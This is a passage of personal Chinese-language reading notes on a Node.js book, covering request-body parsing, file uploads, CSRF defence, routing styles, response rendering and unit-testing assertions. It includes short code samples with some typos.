    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    req<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      req<span class="token punctuation">.</span>rawBody <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>buffers<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>在接收到的Buffer列表转化为一个Buffer对象后，再转换为没有乱码的字符串，暂时挂置在req.rawBody处。</p> <h4 id="_8-2-1-表单数据"><a href="#_8-2-1-表单数据" class="header-anchor">#</a> 8.2.1 表单数据</h4> <p>默认的表单提交，请求头中的Content-Type字段值为application/x-www-form-urlencoded</p> <h4 id="_8-2-2-其他格式"><a href="#_8-2-2-其他格式" class="header-anchor">#</a> 8.2.2 其他格式</h4> <p>除了表单数据外，常见的提交还有JSON和XML等，判断和解析他们的原理都比较相似，依据Content-Type，JSON类型的值为application/json，XML的值为application/xml。需要注意的是，在Content-Type中可能还附带如下的编码信息<code>Content-Type: application/json; charset=utf-8</code>，所以在做判断时，需要注意区分，如下：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> <span class="token function-variable function">mine</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> str <span class="token operator">=</span> req<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token string">''</span>
  <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre></div><h4 id="_8-2-3-附近上传"><a href="#_8-2-3-附近上传" class="header-anchor">#</a> 8.2.3 附近上传</h4> <p>在HTML代码中，特殊表单与普通表单的差异在于该表单中可以含有file类型的控件，以及需要指定表单属性enctype为multipart/form-data，请求报文头与普通表单也有不同：</p> <div class="language-js extra-class"><pre class="language-js"><code>Content<span class="token operator">-</span>Type<span class="token operator">:</span> multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>AaB03x   
Content<span class="token operator">-</span>Length<span class="token operator">:</span> <span class="token number">18231</span>
</code></pre></div><p><code>boundary=AaB03x</code>指定的是每部分内容的分解符，<code>AaB03x</code>是随机生成的字符串，报文体的内容将通过在它前面添加--进行分割，报文结束后在它前后都加上--表示结束。另外，<code>Content-Type</code>的值必须确保是报文体的长度。</p> <p>由于是文件上传，那么像普通表单，JSON或XML那样先接受内容在解析的方式将变得不可接受，接收大小未知的数据量时，我们需要十分谨慎。如下：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hasBody</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token function-variable function">done</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mine</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'application/json'</span> <span class="token punctuation">{</span>
      <span class="token function">parseJSON</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> done<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mine</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'application/xml'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">parseXML</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> done<span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mine</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'multipart/form-data'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">parseMultipart</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> done<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">hanle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>这里要用到模块formiable。它基于流式处理解析报文，将接收到的文件写入到系统的临时文件夹中，并返回对应的路径，如下所示：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> fromiable <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'formiable'</span><span class="token punctuation">)</span>
<span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>hasBody<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mine</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'multipart/from-data'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">var</span> form <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">formiable<span class="token punctuation">.</span>IncomingForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      form<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> fields<span class="token punctuation">,</span> files</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        req<span class="token punctuation">.</span>body <span class="token operator">=</span> fields
        req<span class="token punctuation">.</span>files <span class="token operator">=</span> files
        <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h4 id="_8-2-4-数据上传与安全"><a href="#_8-2-4-数据上传与安全" class="header-anchor">#</a> 8.2.4 数据上传与安全</h4> <h5 id="内存限制"><a href="#内存限制" class="header-anchor">#</a> 内存限制</h5> <p>攻击者通过客户端能够十分容易的模拟伪造大量数据，如果攻击者每次都提交1MB的内容，那么只要并发请求数量一大，内存很快就会被吃光，解决方案有两种：</p> <ul><li>限制上传内容的大小，一旦超过限制，停止接收数据，并相应400状态码</li> <li>通过流式解析，将数据导向磁盘中，Node值保留文件路径等小数据</li></ul> <h5 id="csrf"><a href="#csrf" class="header-anchor">#</a> CSRF</h5> <p>CSRF全称是Cross-Site Request Forgery, 跨站请求伪造
domian-a：正常提交会携带cookie及from参数值，<br>
domian-b：网页中包含向a服务端发送请求(相关不利代码)的操作</p> <p>XSS主要利用用户输入的不严谨，然后执行js语句，CSRF通过伪造受信任用户发送请求，SCRF可通过XSS实现</p> <p>解决方案，在Session中赋予一个随机值，再做页面渲染过程中，将这个_scrf值告知前端，由于该值是一个随机值，攻击者构造出相同的随机值难度相当大，所以我们只需要在接收端做一次校验就能轻易识别出该请求是否是伪造的</p> <h3 id="_8-3-路由解析"><a href="#_8-3-路由解析" class="header-anchor">#</a> 8.3 路由解析</h3> <p>本节会介绍文件路径，MVC，RESTful等路由方式</p> <h4 id="_8-3-1-文件路径型"><a href="#_8-3-1-文件路径型" class="header-anchor">#</a> 8.3.1 文件路径型</h4> <ol><li>静态文件
这种方式的路由在路径解析的部分有过简单描述，其让人舒服的地方在于URL的路径与网站目录的路径一致，无需转换，非常直观，这种路由的处理方式也十分简单，将请求路径对应的文件发送给客户端即可</li> <li>动态文件
在MVC模式流行之前，根据文件路径执行动态脚本也是基本的路由方式，它的处理原理是Web服务齐全根据URL路径找到对应的文件，如/index.asp或/index.php。Web服务器根绝文件名后缀去寻找脚本的解析器。并传入HTTP请求的上下文。以下是Apache种配置PHP支持的方式：</li></ol> <div class="language-js extra-class"><pre class="language-js"><code>AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token punctuation">.</span>php
</code></pre></div><p>解析器执行脚本，并输出响应报文，达到完成服务的目的。现今大多数的服务器都很只能的根据后缀同事服务动态和静态文件，这种方式在Node中不太常见，主要原因是文件的后缀都是.js，分不清是后端脚本，还是前端脚本，这可不是什么好的设计，而且Node中的Web服务器与应用业务脚本是一体的，无需按这种方式实现</p> <h4 id="_8-3-2-mvc"><a href="#_8-3-2-mvc" class="header-anchor">#</a> 8.3.2 MVC</h4> <p>在MVC流行之前，主流的处理方式都是通过文件路径进行处理的，甚至以为是常态，直到有一天开发者发现用户请求的URL路径原来根具体脚本所在的路径没有任何关系。</p> <p>MVC模型主要思想是将业务逻辑按职责分离，主要分为以下几种：</p> <ul><li>控制器Controller，一组行为的集合</li> <li>模型Model，数据相关的操作和封装。</li> <li>视图View，视图的渲染</li></ul> <p>工作模式如下说明</p> <ul><li>路由解析，根据URL寻找对应的控制器和行为</li> <li>行为调用相关的模型，进行数据操作</li> <li>数据操作结束后，调用视图和相关数据进行页面渲染，输出到客户端</li></ul> <h4 id="_8-3-3-restful"><a href="#_8-3-3-restful" class="header-anchor">#</a> 8.3.3 RESTful</h4> <p>MVC模式大行其道了很多年，知道RESTful的流行，大家才意识到URL也可以设计的很规范，请求方法也能作为逻辑分发的单元。<br>
RESTful的全称是Representational State Transfer，表现层状态转化。符合REST规范的设计，我们成为RESTful设计，他的设计哲学主要将服务器端提供的内容实体看做一个资源，并表现在URL上。比如一个用户的地址如下所示： <code>/user/jacksontian</code></p> <p>这个地址代表了一个资源，对这个资源的操作，主要体现在HTTP请求方法上，不是体现在URL上，过去我们对用户的增删改查或许是这样设计URL的：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token constant">POST</span> <span class="token operator">/</span>user<span class="token operator">/</span>add<span class="token operator">?</span>username<span class="token operator">=</span>jacksontian
<span class="token constant">GET</span> <span class="token operator">/</span>user<span class="token operator">/</span>remove<span class="token operator">?</span>username<span class="token operator">=</span>jacksontian
<span class="token constant">POST</span> <span class="token operator">/</span>user<span class="token operator">/</span>update<span class="token operator">?</span>username<span class="token operator">=</span>jacksontian
<span class="token constant">GET</span> <span class="token operator">/</span>user<span class="token operator">/</span>get<span class="token operator">?</span>username<span class="token operator">=</span>jacksontian
</code></pre></div><p>操作行为主要体现在行为上，主要使用的请求方法是POST和GET，在RESTful设计中，它是如下这样的</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token constant">POST</span> <span class="token operator">/</span>user<span class="token operator">/</span>jacksontian
<span class="token constant">DELETE</span> <span class="token operator">/</span>user<span class="token operator">/</span>jacksontian
<span class="token constant">PUT</span> <span class="token operator">/</span>user<span class="token operator">/</span>jacksontian
<span class="token constant">GET</span> <span class="token operator">/</span>user<span class="token operator">/</span>jacksontian
</code></pre></div><p>它将DELETE和PUT请求方法引入设计中，参与资源的操作和更改资源的状态。<br>
对于这个资源的具体表现形态，也不再如过去一样表现在URL的文件后缀上，过去设计资源的格式与后缀有很大的关联，例如：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token constant">GET</span> <span class="token operator">/</span>user<span class="token operator">/</span>jacksontian<span class="token punctuation">.</span>json
<span class="token constant">GET</span> <span class="token operator">/</span>user<span class="token operator">/</span>jacksontian<span class="token punctuation">.</span>xml
</code></pre></div><p>在RESTful设计中，资源的具体格式由请求报头中的Accept字段和服务端的支持情况来决定，如果客户端同时接受JSON和XML格式的响应，那么它的Accept字段值是如下这样的：<code>Accept: application/json,application/xml</code>。<br>
靠谱的服务器端应该要顾及这个字段，然后根据自己能响应的格式做出相应，在响应报文中，通过Content-Type字段告知客户端是什么格式，如<code>Content-Type: application/json</code><br>
具体格式，我们称之为具体的表现，所以REST的设计就是，通过URL设计资源，请求方法定义资源的操作，通过Accept决定资源的表现形式。<br>
RESTful与MVC并不冲突，而且是更好的改进，相比MVC，RESTful知识将HTTP请求方法也加入了路由的过程，以及在URL路径上体现的更资源化</p> <h3 id="_8-4-中间件"><a href="#_8-4-中间件" class="header-anchor">#</a> 8.4 中间件</h3> <p>// Todo<br>
// 看了一遍不是很懂~~</p> <h3 id="_8-5-页面渲染"><a href="#_8-5-页面渲染" class="header-anchor">#</a> 8.5 页面渲染</h3> <h4 id="_8-5-1"><a href="#_8-5-1" class="header-anchor">#</a> 8.5.1</h4> <p>服务器端的响应报文，最终都要被终端处理，这个终端可能是命令行终端，也可能是代码终端，也可能是浏览器。服务器端的响应从一定程度上决定或指示了客户端该如何处理响应的内容。内容响应的过程中，响应报头中的Content-*字段十分重要，如下：</p> <div class="language-js extra-class"><pre class="language-js"><code>Content<span class="token operator">-</span>Encoding<span class="token operator">:</span> gzip
Content<span class="token operator">-</span>Length<span class="token operator">:</span> <span class="token number">21170</span>
Content<span class="token operator">-</span>Type<span class="token operator">:</span> text<span class="token operator">/</span>javascript<span class="token punctuation">;</span> charset<span class="token operator">=</span>utf<span class="token operator">-</span><span class="token number">8</span>
</code></pre></div><p>上面报文服务器端告诉客户端内容是以gzip编码的，其内容长度为21170个字节，内容类型为javascript，字符集为UTF-8。<br>
客户端在收到这个报文后，正确的处理过程是通过gzip来解码报文体中的内容，用长度校验报问题内容是否正确，然后再以字符集UTF-8将解码后的脚本插入到文档节点中</p> <div class="language-js extra-class"><pre class="language-js"><code>res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>Content<span class="token operator">-</span>Type<span class="token operator">:</span> <span class="token string">''</span>text<span class="token operator">/</span>plain<span class="token punctuation">}</span><span class="token punctuation">)</span>
res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'&lt;html&gt;&lt;body&gt;hello world&lt;/body&gt;&lt;/html&gt;'</span><span class="token punctuation">)</span>
res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>Content<span class="token operator">-</span>Type<span class="token operator">:</span> <span class="token string">''</span>text<span class="token operator">/</span>html<span class="token punctuation">}</span><span class="token punctuation">)</span>
res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'&lt;html&gt;&lt;body&gt;hello world&lt;/body&gt;&lt;/html&gt;'</span><span class="token punctuation">)</span>
<span class="token comment">// 前者显示整段文本，后者只显示hello world</span>
</code></pre></div><p>浏览器通过不同的Content-Type的值来决定采用不同的渲染方式，这个值我们简称为MIME，全称为Multipurpose Internet Mail Extensions，从名字可以看出，它最早应用于电子邮件，后来也应用到浏览器中。</p> <p>在一些场景下，无论响应的是什么样的MIME值，需求中并不要要求客户端去打开它，只需弹出并下载它即可。为了满足这种需求，Content-Disposition字段登场，浏览器会根据该字段的值判断时应该讲报文数据当做即时浏览器的内容，还是可下载的附件。当内容只需即时查看时，它的值是inline，当数据可以存为附件时，它的值为attachment。另外Content-Disposition字段还能通过参数指定保存时应该使用的文件名。如下：</p> <div class="language-js extra-class"><pre class="language-js"><code>Content<span class="token operator">-</span>Disposition<span class="token operator">:</span> attachment<span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">'filename.txt'</span>
</code></pre></div><p>如果我们要设计一个响应附件下载的API(res.sendfile),我们的方法大致如下</p> <div class="language-js extra-class"><pre class="language-js"><code>res<span class="token punctuation">.</span><span class="token function-variable function">sendfile</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">filepath</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  fs<span class="token punctuation">.</span><span class="token function">stat</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//stat检查文件是否存在</span>
    <span class="token keyword">var</span> stream <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">createReadStream</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>
    <span class="token comment">// 设置内容</span>
    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> mime<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment">// 设置长度</span>
    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Length'</span><span class="token punctuation">,</span> stat<span class="token punctuation">.</span>size<span class="token punctuation">)</span>
    <span class="token comment">// 设置为附件</span>
    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">,</span> <span class="token string">'attachment; filename=&quot;'</span><span class="token operator">+</span>path<span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'&quot;'</span><span class="token punctuation">)</span>
    res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
    stream<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><p>如下为响应json</p> <div class="language-js extra-class"><pre class="language-js"><code>res<span class="token punctuation">.</span><span class="token function-variable function">json</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">json</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'application/json'</span><span class="token punctuation">)</span>
  res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><h4 id="_8-5-2-视图渲染"><a href="#_8-5-2-视图渲染" class="header-anchor">#</a> 8.5.2 视图渲染</h4> <p>普通的HTML内容响应，统称为视图渲染，通常我们将渲染方法设计为render()，如</p> <div class="language-js extra-class"><pre class="language-js"><code>res<span class="token punctuation">.</span><span class="token function-variable function">render</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">view<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/plain'</span><span class="token punctuation">)</span>
  res<span class="token punctuation">.</span><span class="token function">setHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
  <span class="token comment">// 实际渲染</span>
  <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token function">render</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><h4 id="_8-5-3-模板"><a href="#_8-5-3-模板" class="header-anchor">#</a> 8.5.3 模板</h4> <p>服务端动态渲染技术，如ASP,PHP,JSP，他们将动态语言通过特殊的标签(ASP和JSP以&lt;%%&gt;作为标志，PHP则以&lt;??&gt;作为标志)，通过HTML和模板标签混排，将开发者从输出HTML的工作中解脱出来，这样的方法虽然一定程度上减轻了开发维护的难度，但是页面里还是充斥着大量的逻辑代码。这催生了MVC在动态网页技术中的发展，MVC将逻辑，显示，数据分离开的方式，大大提高了项目的可维护性</p> <h4 id="_8-6-小结"><a href="#_8-6-小结" class="header-anchor">#</a> 8.6 小结</h4> <p>在web应用构建过程中，从处理请求到响应过程的整个过程都需要考虑</p> <h3 id="第九章-玩转进程"><a href="#第九章-玩转进程" class="header-anchor">#</a> 第九章 玩转进程</h3> <p>单线程的劣势：如何充分利用多核CPU服务器，如何保证进程的健壮性和稳定性？(一旦单线程上抛出的异常没有被捕获，将会引起整个进程的崩溃)</p> <h4 id="_9-1-服务器的变迁"><a href="#_9-1-服务器的变迁" class="header-anchor">#</a> 9.1 服务器的变迁</h4> <ol><li>每个连接都需要一个进程来服务</li> <li>每个线程服务一个请求，即多线程/多进程，但是操作系统内核在切换线程的同时也要切换线程的上下文，当线程数量较多时，时间消耗会很大</li> <li>为了解决高并发问题，基于事件驱动的服务模型出现了，像Node与Nginx都是基于事件驱动的方式实现的</li></ol> <h4 id="_9-2-多进程架构"><a href="#_9-2-多进程架构" class="header-anchor">#</a> 9.2 多进程架构</h4> <p>child_process模块<br>
Master-Worker模式，又称主从模式。进程分两种，主进程和工作进程，这是典型的分布式架构中用于并行处理业务的模式，具有较好的可伸缩性和稳定性
// Todo 后面的没看 QAQ</p> <h4 id="_9-3-集群稳定之路"><a href="#_9-3-集群稳定之路" class="header-anchor">#</a> 9.3 集群稳定之路</h4> <p>// 待看</p> <h4 id="_9-4-cluster模块"><a href="#_9-4-cluster模块" class="header-anchor">#</a> 9.4 Cluster模块</h4> <p>// 待看</p> <h3 id="第十章-测试"><a href="#第十章-测试" class="header-anchor">#</a> 第十章 测试</h3> <p>测试包括单元测试，性能测试，安全测试，功能测试等几个方面，本章将从Node事件的角度来介绍单元测试和性能测试</p> <h4 id="_10-1-单元测试"><a href="#_10-1-单元测试" class="header-anchor">#</a> 10.1 单元测试</h4> <p>编写可测试代码有以下几个原则可以遵循</p> <ul><li>单一职责，一段代码中既包含数据库的连接，也包含查询，较好的方式是将这两种职责进行解耦分离，变成两个单一职责的方法</li> <li>接口抽象，通过对程序代码进行接口抽象后，我们可以针对接口进行测试而具体代码实现的变化不影响为接口编写的单元测试</li> <li>层次分离，层次分离实际上是单一职责的一种实现。在MVC结构的应用中，就是典型的层次分离模型，如果不分离各个层次，无法想象这个代码该如何切入测试，通过分层之后，可以逐层测试，逐层保证。</li></ul> <h4 id="_10-1-2-单元测试介绍"><a href="#_10-1-2-单元测试介绍" class="header-anchor">#</a> 10.1.2 单元测试介绍</h4> <p>单元测试主要包括断言，测试框架，测试用例，测试覆盖率，mock，持续集成等几个方面，由于Node的特殊性，它还会加入异步代码测试和私有方法的测试这两个部分</p> <ol><li>断言</li></ol> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> readOF <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'readof'</span><span class="token punctuation">)</span>
readOF<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>pic<span class="token punctuation">,</span> target_path<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// do something</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>上述开源模块，对质量没有任何保证，主要源于以下两点：</p> <ul><li>没有对输出结果进行任何的检测</li> <li>输入条件覆盖率并不完备
这样的示例代码展现的是&quot;It works&quot;而不是&quot;Testing&quot;，示例代码可以正常运行并不代表代码是没有问题的。如何对输出结果进行检测，以确认方法调用是正常的，是最基本的测试点。断言就是单元测试中用来保证最小单元是否正常的检测方法。</li></ul> <blockquote><p>断言：维基本科大的解释是： 在程序设计中，断言(assertion)是一种放在程序中的一阶逻辑(如一个结果为真或是假地逻辑判断式)，目的是为了标识程序开发者预期的结果-——当程序运行到断言的位置时，对应的断言应该为真，若断言不为真，程序会中止执行，并出现错误信息。</p></blockquote> <p>简言之，断言用于检查程序在运行时是否满足期望</p> <p>使用assert模块，assert.equal()不满足期望，将会抛出AsssertionError异常，整个程序将会停止执行，没有对输出结果进行任何断言检查的代码，都不是测试代码，没有测试代码的代码，都是不可信的代码。<br>
在断言规范中，定义以下几种检测方法</p> <ul><li>ok(),判断结果是否为真</li> <li>equal(),判断实际值与期望值是否相等</li> <li>notequal(),判断实际值与期望值是否不相等</li> <li>deepEqual(),判断实际值与期望值是否深度相等(对象或数组的元素是否相等)</li> <li>noteepEqual(),判断实际值与期望值是否bu深度相等</li> <li>strictEqual(),判断实际值与期望值是否严格相等(相当于===)</li> <li>notStrictEqual(),判断实际值与期望值是否不严格相等(相当于!==)</li> <li>throw(),判断代码块是否抛出异常<br>
Node seert模块还扩充了如下两个断言方法</li></ul></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/reading-notes/books19/you-don't-know-js1.html" class="prev">
        你不知道的Javascript(上卷)
      </a></span> <span class="next"><a href="/reading-notes/books19/understanding-webpack.html">
        深入浅出webpack
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"><!----><div id="live2d-widget" class="live2d-widget-container" style="position:fixed;right:15px;bottom:60px;width:150px;height:300px;z-index:99999;opacity:0.8;pointer-events:none;"><canvas id="live2d_canvas" width="150" height="300" class="live2d_canvas" style="position:absolute;left:0px;top:0px;width:150px;height:300px;"></canvas></div></div></div>
    <script src="/reading-notes/assets/js/app.3c3209d0.js" defer></script><script src="/reading-notes/assets/js/2.a1b00631.js" defer></script><script src="/reading-notes/assets/js/11.7a9ed704.js" defer></script>
  </body>
</html>
